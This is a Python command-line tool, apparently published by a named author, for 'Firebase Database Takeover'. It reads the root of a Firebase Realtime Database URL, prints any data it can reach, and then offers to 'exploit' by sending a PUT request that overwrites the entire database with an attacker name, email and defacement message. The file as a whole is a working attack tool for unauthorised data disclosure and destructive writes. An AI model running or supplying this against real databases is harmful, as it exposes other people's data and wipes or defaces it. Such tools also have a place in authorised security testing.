import argparse
import requests
import re
from colorama import init, Fore

# Initialize colorama to work with Windows as well
init()

def banner():  
    print(f"{Fore.CYAN}")
    print("███████╗██████╗ ████████╗")
    print("██╔════╝██╔══██╗╚══██╔══╝")
    print("█████╗  ██║  ██║   ██║   ")
    print("██╔══╝  ██║  ██║   ██║   ")
    print("██║     ██████╔╝   ██║   ")
    print("╚═╝     ╚═════╝    ╚═╝   ")
    print(f"{Fore.GREEN}Firebase Database Takeover")
    print()
    print(f"{Fore.BLUE}Youtube: {Fore.RESET}https://www.youtube.com/@hackerno21")
    print(f"{Fore.BLUE}GitHub: {Fore.RESET}https://github.com/akhilkoradiya")
    print(f"{Fore.BLUE}Twitter: {Fore.RESET}https://twitter.com/akhilkoradiya21")
    print(f"{Fore.BLUE}Linkedin: {Fore.RESET}https://in.linkedin.com/in/akhil-koradiya-2722a51a0")
    print()
    print(f"{Fore.MAGENTA}# Written by Akhil Koradiya.{Fore.RESET}")
    print("\033[1m----------------------------------------------\033[0m\n")

def remove_path_from_url(url):
    url_parts = url.split("://", 1)
    scheme = url_parts[0]
    remaining_url = url_parts[1] if len(url_parts) > 1 else ""

    if "/" in remaining_url:
        netloc, path = remaining_url.split("/", 1)
        return f"{scheme}://{netloc}"
    else:
        return url

def is_valid_url(url):
    # url_pattern = r"^(https?://)?([\da-z.-]+)\.([a-z.]{2,6})([/\w .-]*)*/?$"
    url_pattern = r"^(https?://)?([\da-z.-]+)\.([a-z.]{2,6})$"
    return re.match(url_pattern, url)

def is_valid_email(email):
    email_pattern = r"^\w+@[a-zA-Z_]+?\.[a-zA-Z]{2,3}$"
    return re.match(email_pattern, email)

def check_vulnerability(response):
    try:
        response_json = response.json()
        if isinstance(response_json, dict) and "error" in response_json and response_json["error"] == "Permission denied":
            return False
        return True
    except ValueError:
        return False

def add_data_to_firebase(firebaseURL):
    exploit = input("\nDo you want to exploit: [Y/n] ")
    if exploit == "y" or exploit == "Y":
        print(f"{Fore.RED}\nIf no information is provided then")
        print(f"{Fore.LIGHTBLUE_EX}\n# Default value of attacker:") 
        print(f"{Fore.RESET}Name: Hacker\nEmail: xyz@xyz.com\nMessage: Firebase database takeover by hackerno21\n")
        name = input("Attacker name: ")
        if not name.strip(): name = "Hacker"
        while True:
            email = input("Attacker email: ")
            if email.strip():
                if not is_valid_email(email):
                    print(f"{Fore.RED}Invalid email format. Please provide a valid email address.{Fore.RESET}")
                else:
                    break
            else:
                email = "xyz@xyz.com"
                break
        message = input("Attacker message: ")
        if not message.strip(): message = "Firebase database takeover by hackerno21"

        try:
            data = {
                "name": name,
                "email": email,
                "Message": message
            }

            response = requests.put(firebaseURL + "/.json", json=data)
            if response.status_code == 200:
                print(f"{Fore.GREEN}Data added successfully.")
                print(f"\n{Fore.YELLOW}PoC(Proof of concept) URL: {firebaseURL}/.json")
            else:
                print(f"{Fore.RED}Failed to add data: {response.text}")

        except Exception as e:
            print(f"{Fore.RED}Error: {str(e)}")
    else: 
        print(f"\n{Fore.YELLOW}PoC(Proof of concept) URL: {firebaseURL}/.json")
        print(f"\n{Fore.YELLOW}Thank you for using this tool. Have a great day!")

def check_firebase(url):
    if not is_valid_url(url):
        print(f"{Fore.RED}Invalid Firebase URL. Please provide a valid URL.")
        return
    
    response = requests.get(url + "/.json")
    
    if check_vulnerability(response):
        print(f"{Fore.GREEN}Firebase database is vulnerable.")
        if response.json == "null":
            add_data_to_firebase(url)
        else:
            print(f"{Fore.RED}\n# Vulnerability information:") 
            print(f"\n{Fore.RESET}Name: Firebase database information disclosure\n{Fore.RESET}Expose information:",response.json())
            add_data_to_firebase(url)
    else:
        print(f"{Fore.RED}Firebase database is not vulnerable.")

def main():
    try: 
        parser = argparse.ArgumentParser(description=banner())
        parser.add_argument("firebase_url", nargs="?", help="Firebase Database URL")
        args = parser.parse_args()

        if args.firebase_url:
            url = remove_path_from_url(args.firebase_url)
            check_firebase(url.rstrip("/"))
        else:
            print(f"{Fore.RED}No Firebase URL provided. Please use -h or --help for usage instructions.")

    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Thank you for using this tool. Have a great day!")

if __name__ == "__main__":
    main()